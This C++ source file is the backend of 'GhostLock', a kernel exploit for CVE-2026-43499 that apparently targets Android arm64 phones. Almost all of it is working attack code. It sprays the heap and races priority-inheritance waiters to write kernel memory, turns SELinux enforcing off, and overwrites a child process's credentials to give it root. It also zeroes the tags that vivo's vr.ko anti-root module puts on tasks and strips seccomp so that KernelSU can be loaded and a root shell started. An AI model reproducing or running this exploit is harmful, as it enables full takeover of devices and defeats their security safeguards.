/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
 *
 * The setup stage, the W1-W3 step sequence and the shared write/retry
 * primitives moved out of the retired ExploitProcedure. The middleware policy
 * is a template parameter: route hooks are direct static calls on `Middleware`
 * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
 * own backend code. The body is otherwise unchanged: same statements, same
 * order, same log text.
 */

#include "session/backend/cve_2026_43499_backend.hpp"

#include "attack/ops.hpp"
#include "common.h"
#include "kernel/target.h"
#include "kernelsnitch/utils.h"
#include "profile/macros.h"
#include "race/threads.hpp"
#include "route/route_api.hpp"
#include "route/route_middleware.hpp"
#include "route/route_policy.hpp"
#include "session/handoff_probe.hpp"
#include "session/victim_process.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"

#include <unistd.h>

#include <array>
#include <cstdint>
#include <optional>
#include <string_view>
#include <utility>

namespace ghostlock::session::backend {
    namespace {
        /* Shared write/retry sequence. */
        template <class M>
        Status retry_write_stage(
            ExploitSession &session,
            const char *stage,
            uintptr_t target,
            int32_t mode,
            uint32_t attempts,
            useconds_t settle_usec,
            write_stage_verify_fn verify,
            void *context,
            int32_t leaf) {

            /* no attempt can move a target that is wrong by construction, and the
             * stage belongs in the log with the address rather than the route */
            if (!attack::in_direct_map(target)) {
                pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
                return false;
            }

            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);

            for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                pr_info("%s attempt %u/%u\n", stage, attempt, attempts);

                /* the previous attempt's write can land after its verify read; check
                 * before paying for another heap spray */
                if (attempt > 1 && verify(context)) {
                    return true;
                }
                if (attempt == 1) {
                    attack::slab_drain();
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_prebuild(session)) return false;
                }
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                if (!routed) {
                    support::discard_prebuilt_page();
                    pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
                    usleep(100000);
                    continue;
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_activate(session)) return false;
                }
                if (settle_usec) usleep(settle_usec);
                if (verify(context)) return true;
                usleep(50000);
            }
            /* the last write can land after its verify read */
            return verify(context) != 0;
        }

        /* W3 chain retry: park the previous rooted child on its command pipe so the
         * late-load stage can still start a root shell from it. */
        void park_retry_child(ExploitSession &session, VictimChain &chain,
                              const uint32_t round, const uint32_t chain_rounds) {
            victim::VictimContext &pipes = session.victim;
            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
                       round, chain_rounds);
            if (chain.child_alive && pipes.child() > 0) {
                write(pipes.cmd_write.get(), "P", 1);
                usleep(50000);
                session.parked_victim = pipes.release_child();
                session.parked_victim_cmd = std::move(pipes.cmd_write);
            } else {
                pipes.cmd_write.reset();
            }
            pipes.uid_read.reset();
            chain.child_alive = 1;
            chain.seccomp_ok = 0;
        }

        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
         * Retry means the perf leak missed and the chain should respawn. */
        template <class M>
        VictimRound w2(ExploitSession &session, VictimChain &chain,
                       victim::w2_stage_context &w2_context,
                       uintptr_t &child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;

            const auto spawned = victim::spawn_victim(pipes);
            if (!spawned) {
                pr_warning("fork failed\n");
                return VictimRound::Failed;
            }
            child_task = spawned->task;
            attack::timer_mark("perf_find_task done");

            if (!child_task) {
                /* nothing rooted yet; safe to kill and burn a round */
                pr_warning("perf leak did not reproduce; retrying next round\n");
                const pid_t unrooted = pipes.release_child();
                if (unrooted > 0) {
                    kill(-unrooted, SIGKILL);
                    waitpid(unrooted, nullptr, 0);
                }

                child_alive = 0;
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                return VictimRound::Retry;
            }

            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
            /* ------------------------------------------------------------------
         * vivo vr.ko anti-root per-task bypass (ported from root.c)
         * ------------------------------------------------------------------
         * Always compiled: the /proc/modules probe below decides at runtime
         * whether the writes run. The tag-B offset is overridable at build time
         * (profile/macros.h), not gated by a define.
         *
         * vr.ko tags every app-origin task at fork/clone time. When the task
         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
         * strip the tag BEFORE W2 verify runs the child's getuid().
         *
         * This exploit primitive is 64-bit granular, so:
         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
         *     clears the syscall-tracepoint bit (0x400). This takes the task
         *     off the sys_exit slow-path immediately.
         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
         * ------------------------------------------------------------------ */
            support::run_state::enter("w2b");
            {
                static int32_t vr_needed = -1;
                if (vr_needed < 0) {
                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
                    if (FILE *m = fopen("/proc/modules", "r")) {
                        auto close_modules = ghostlock::support::make_scope_exit(
                            [m]() noexcept { fclose(m); });
                        std::array<char, 256> mod{};
                        vr_needed = 0;
                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
                            const std::string_view line(mod.data());
                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
                             * then the module-name separator. */
                            const bool vr_prefix =
                                    line.size() >= 2 &&
                                    (line[0] == 'v' || line[0] == 'V') &&
                                    (line[1] == 'r' || line[1] == 'R');
                            if (vr_prefix && line.size() > 2 &&
                                (line[2] == ' ' || line[2] == '_')) {
                                vr_needed = 1;
                                break;
                            }
                        }
                    }
                    pr_info("vr.ko %s\n", vr_needed
                            ? "loaded; clearing tags"
                            : "not loaded; skipping tag clear");
                }

                int32_t vr_ok = 1;
                if (vr_needed) {
                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                    const memory::WriteRequest flags_request = memory::WriteRequest::make(
                        child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");

                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                    if (vr_ok) {
                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                        const memory::WriteRequest tagb_request =
                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
                    }

                    if (vr_ok) {
                        pr_success("VR.ko per-task tags cleared\n");
                    } else {
                        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                    }
                }
            }
            support::run_state::complete("w2b");

            support::run_state::enter("w2a");
            Status got_root = retry_write_stage<M>(
                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                g_exploit_session.profile.w2_attempts(),
                g_exploit_session.profile.w2_settle_us(),
                victim::verify_w2_stage, &w2_context, 0);
            if (!got_root) {
                write(pipes.cmd_write.get(), "X", 1);
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                pr_warning("W2 failed after %u rounds\n",
                           g_exploit_session.profile.w2_attempts());
                waitpid(pipes.child(), nullptr, WNOHANG);
                return VictimRound::Failed;
            }
            support::run_state::complete("w2a");
            chain.ever_rooted = 1;
            /* rooted children never exit; chain failures park (P) */
            return VictimRound::Rooted;
        }

        /* W3: put the rooted child into a real SECCOMP_MODE_DISABLED state using
         * the only word value the write primitive can store: zero.
         *
         * Kernel facts this depends on (v6.6 arm64, read from source):
         *  - a syscall runs seccomp only while TIF_SECCOMP (bit 11 of
         *    thread_info.flags, task+0x00) is set: arch/arm64/kernel/
         *    entry-common.c and kernel/entry/common.c gate on that flag, and
         *    include/linux/thread_info.h maps set_task_syscall_work(SECCOMP)
         *    onto TIF_SECCOMP because arm64 6.6 has no syscall_work word;
         *  - kernel/seccomp.c __secure_computing() has no SECCOMP_MODE_DISABLED
         *    case (`default: BUG()`), so zeroing seccomp.mode while the flag is
         *    still set panics the kernel on the next syscall - that, not the
         *    filter reference count, was the old "mode-only" panic;
         *  - kernel/fork.c copy_seccomp() re-arms TIF_SECCOMP in every child
         *    while seccomp.mode != DISABLED, so clearing the flag alone still
         *    leaves `sh -> ksud` filtered;
         *  - kernel/exit.c release_task() releases seccomp.filter regardless of
         *    mode, so mode=DISABLED with the filter pointer still set is
         *    consistent: no leak and no free_task() WARN.
         *
         * The clear is therefore two whole-word zero stores - thread_info.flags,
         * then the {mode, filter_count} word - performed while the child is
         * parked in a group stop. Zero is exactly the leaf arm of the primitive
         * (WriteMode::Zero with leaf=1), the same store the comm probe has
         * already proved on this very task. Masked or mode=0/filter_count=1
         * words are outside the primitive's value space (the walk consumes the
         * value as an rb parent pointer), which is why the previous W3 returned
         * success and changed nothing. */
        template <class M>
        bool w3(ExploitSession &session, VictimChain &chain,
                victim::w2_stage_context &w2_context,
                uintptr_t child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;
            int32_t &seccomp_ok = chain.seccomp_ok;

            /* The shell/Shizuku flow runs without an app filter (Seccomp: 0) and
             * fork() inherits that, so its child needs no W3. tcp stamps
             * *(target) exactly; the pselect fallback needs the comm probe to
             * tell [target] from [target+8]. */
            if (!attack::process_has_seccomp()) {
                pr_success("no app seccomp filter (shell flow); skipping W3\n");
                seccomp_ok = 1;
                return true;
            }

            constexpr bool exact_target = M::w3_exact_target;
            victim::w3_stage_context w3_context = {
                .pipes = pipes,
                .leaf_to_target8 = !exact_target,
            };
            if (!exact_target) {
                support::run_state::enter("w3a");
                Status dir_ok = retry_write_stage<M>(
                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                    victim::verify_leaf_dir_stage, &w3_context, 1);
                if (!dir_ok) {
                    /* U01/S14: upstream retires the child instead of guessing the leaf
                 * direction and blind-writing the task neighbour. Returning false
                 * hands control back to the W2/W3 chain, which parks this child and
                 * spawns a fresh one for the next round. */
                    pr_warning("W3 leaf direction probe failed; retiring child\n");
                    return false;
                }
                support::run_state::complete("w3a");
            } else {
                support::run_state::complete("w3a");
            }

            const uintptr_t flags_target = w3_context.leaf_to_target8
                                               ? child_task - 8
                                               : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
            const uintptr_t mode_target = w3_context.leaf_to_target8
                                              ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                              : child_task + ghostlock::profile::task_seccomp_off();

            /* One zero store. Until the child runs again there is no
             * userspace-visible state to verify against, so an attempt either
             * reports a landed relink or is simply re-run. */
            const uint32_t write_attempts = g_exploit_session.profile.w3_attempts();
            const auto zero_word = [&](uintptr_t target, const char *stage) {
                const memory::WriteRequest request =
                        memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
                for (uint32_t attempt = 1; attempt <= write_attempts; attempt++) {
                    pr_info("%s attempt %u/%u\n", stage, attempt, write_attempts);
                    if (attempt == 1) attack::slab_drain();
                    if (Cve2026_43499Policy::template attack_write<M>(session, request, stage))
                        return true;
                    usleep(100000);
                }
                return false;
            };

            /* Park the child for the whole window: mode=DISABLED with the flag
             * still set is a BUG, and a fork would re-arm the flag. */
            support::run_state::enter("w3b");
            if (!victim::stop_child(pipes)) {
                support::run_state::fail("w3b");
                if (pipes.child() <= 0) child_alive = 0;
                pr_warning("W3 could not park the rooted child\n");
                return false;
            }
            /* Stop at the first failed store: a partial state is only safe while
             * mode stays FILTER, so never zero mode after a missed flag write. */
            bool cleared = zero_word(flags_target, "W3: TIF_SECCOMP clear");
            if (cleared) cleared = zero_word(mode_target, "W3: seccomp mode clear");
            /* Insurance: the flag word is the store that keeps every partial
             * state safe, so give it a second, independent landing while the
             * child is still parked. */
            if (cleared) cleared = zero_word(flags_target, "W3: TIF_SECCOMP re-clear");
            /* `completed` means the stores were issued and every route reported a
             * landed relink; it is not the bypass verdict. A route that refuses
             * the request must never look like success (the pre-fix W3 recorded
             * `completed` for writes the primitive rejected). */
            if (cleared) {
                support::run_state::complete("w3b");
            } else {
                support::run_state::fail("w3b");
            }
            usleep(g_exploit_session.profile.w3_settle_us());

            support::run_state::enter("w3c");
            const int32_t mode = victim::continue_and_report_seccomp(pipes);
            pr_info("W3: child reports Seccomp: %d\n", mode);
            if (mode != 0) {
                support::run_state::fail("w3c");
                pr_warning("W3 seccomp clear failed (mode=%d writes=%d); ksud "
                           "late-load will stay blocked\n", mode, cleared ? 1 : 0);
                return false;
            }
            /* The fork probe is the verdict: it passes only when copy_seccomp()
             * stops re-arming TIF_SECCOMP, which is the property ksud needs one
             * process further down the chain. */
            if (!victim::verify_fork_seccomp_stage(&w2_context)) {
                support::run_state::fail("w3c");
                pr_warning("W3: mode is disabled but a forked child is re-armed\n");
                return false;
            }
            /* Informational: the errno cannot separate filtered from unfiltered. */
            victim::probe_finit_module_stage(&w2_context);
            support::run_state::complete("w3c");
            seccomp_ok = 1;
            pr_success("child seccomp disabled (mode=0); descendants run filter-free\n");
            return true;
        }

        /* W1b: the non-resident multicast middleware repairs its private scratch
         * page before W2. The body stays here because it calls the shared write
         * primitive; whether it is needed is a capability of the middleware. */
        template <class M>
        bool w1_scratch_repair(ExploitSession &session) {
            if constexpr (!M::multicast) {
                return true;
            } else {
                const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                const uintptr_t w1_scratch_poison =
                        (session.heap.current.base) + mcast.buffer_size.value_or(0);
                if (!support::quarantine_reclaim_sockets()) {
                    pr_warning("W1 scratch page quarantine failed\n");
                    return false;
                }
                int32_t repaired = 0;
                const uint32_t repair_attempts =
                        g_exploit_session.profile.w1_scratch_repair_attempts();
                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                    pr_info("W1b: private scratch repair attempt %u/%u\n",
                            repair_try, repair_attempts);
                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                        w1_scratch_poison, memory::WriteMode::Zero, 1);
                    if (Cve2026_43499Policy::template attack_write<M>(
                            session, scratch_repair, "W1b: private scratch repair")) {
                        repaired = 1;
                        break;
                    }
                    usleep(50000);
                }
                if (repaired) {
                    pr_success("private scratch repaired; releasing quarantine\n");
                    support::release_quarantined_reclaim_sockets();
                    return true;
                }
                pr_warning("private scratch repair failed; keeping page quarantined\n");
                return false;
            }
        }

        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
        template <class M>
        StageResult w1(ExploitSession &session) {
            /* W1: disable SELinux before task discovery. untrusted_app may not be able
         * to read enforce while it is still enforcing, so attempt W1 regardless. */
            Status selinux_ok = attack::check_selinux_off();
            if (!selinux_ok) {
                if (!attack::enforce_readable()) {
                    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
                }
                attack::timer_mark("pre-W1 drain");
                uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
                if constexpr (M::multicast) {
                    /* a non-resident multicast write cannot safely retry a missed W1 */
                    w1_attempts = 1;
                }
                support::run_state::enter("w1a");
                selinux_ok = retry_write_stage<M>(
                    session,
                    "W1: SELinux",
                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
                    1, w1_attempts,
                    g_exploit_session.profile.w1_settle_us(),
                    victim::verify_selinux_stage, nullptr, 0);

                if (!selinux_ok) {
                    pr_warning("Write 1 failed\n");
                    return StageResult::Failed;
                }
                support::run_state::complete("w1a");
                support::run_state::enter("w1b");
                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                support::run_state::complete("w1b");
                attack::timer_mark("Write 1 complete");
            } else {
                pr_success("SELinux already permissive\n");
                support::run_state::complete("w1a");
                support::run_state::complete("w1b");
            }
            return StageResult::Continue;
        }
    } // namespace

    /* Stage: process setup and profile installation. */
    StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        session.heap.init();
        support::disable_rseq_for_thread();
        kernel::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        kernel::set_limit();
        route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!session.profile.loaded())
            attack::install_profile(decoded);
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        attack::write_root_script();

        attack::apply_iomem_cache();
        support::log_startup_context();
        support::init_p0_profile();
        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        attack::timer_reset();
        attack::timer_mark("exploit start");
        return StageResult::Continue;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                             const memory::WriteRequest &request,
                                             const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!attack::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write *(target) := value through the erase left-only
         * relink: waiter words are {pc = value, right = 0, left = target} and
         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
        attack::timer_mark("  heap spray start");
        (session.heap.current.base) = support::prepare_good_kernel_page(request);
        if (!(session.heap.current.base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        attack::timer_mark("  heap spray done");
        Status routed = route::middleware::run_middleware_route(session, request);

        attack::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    template <class M>
    StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         VictimChain &chain) {
        switch (run_setup(session, decoded, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }
        switch (w1<M>(session)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
         * child, so respawn and redo. */
        attack::slab_drain();
        attack::timer_mark("pre-W2 drain");
        victim::w2_stage_context w2_context = {.pipes = session.victim};
        const uint32_t chain_rounds = g_exploit_session.profile.w3_chain_rounds();
        for (uint32_t round = 1; round <= chain_rounds; round++) {
            if (round > 1) park_retry_child(session, chain, round, chain_rounds);

            uintptr_t child_task = 0;
            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
            if (rooted == VictimRound::Failed) return StageResult::Failed;
            if (rooted == VictimRound::Retry) continue;
            if (w3<M>(session, chain, w2_context, child_task)) break;
        }
        if (!chain.seccomp_ok) {
            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                       chain_rounds);
        }
        /* The frontend handoff step finishes the run. */
        return StageResult::Continue;
    }

    /* Explicit instantiations: the catalogued middleware policies. Callers only
     * include the header; the definitions stay in this unit. */
    template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);

    template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
} // namespace ghostlock::session::backend
